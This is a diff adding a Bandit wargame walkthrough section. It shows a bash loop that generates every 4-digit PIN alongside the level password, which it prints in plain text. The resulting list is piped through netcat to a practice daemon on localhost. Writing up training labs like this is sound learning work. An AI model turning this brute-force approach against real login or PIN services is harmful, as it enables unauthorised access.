@@ -446,7 +446,25 @@ This grants read, write, and execute permissions to all users, allowing the scri
 
         cat password.txt
 
+### Bandit Level 24 → Level 25
+**Key Takeaways**: Learn how to create a brute-forcing script, in conjunction with the nc command. A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
 
+**Approach**:
 
+*Step 1:* The goal is to brute force a 4-digit numeric PIN by sending multiple inputs to the daemon listening on port 30002 using netcat. When the correct combination is sent, the daemon responds with the password for the next level.
 
+To automate this, we first create a file to store all possible 4-digit PINs:
 
+        touch pinlist.txt
+
+*Step 2:* Next, we write a Bash script (brutescript.sh) that generates all PINs from 0000 to 9999 and appends them to the file:
+
+        #!/bin/bash
+
+        for i in $(seq -w 0000 9999); do
+            echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> /tmp/arnavbrute/pinlist.txt
+        done
+
+*Step 3:* Once the list is ready, we send it to the daemon using netcat:
+
+        cat pinlist.txt | nc localhost 30002
